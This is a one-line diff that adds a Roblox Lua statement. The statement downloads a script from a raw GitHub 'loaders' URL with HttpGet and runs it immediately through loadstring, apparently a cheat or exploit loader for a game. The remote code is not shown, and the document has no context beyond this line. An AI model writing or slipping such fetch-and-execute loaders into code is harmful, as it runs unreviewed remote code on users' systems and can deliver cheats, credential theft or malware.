@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/upd-my-anime-mine-spam5-4tt4zn6mo1xnqy.lua"))()
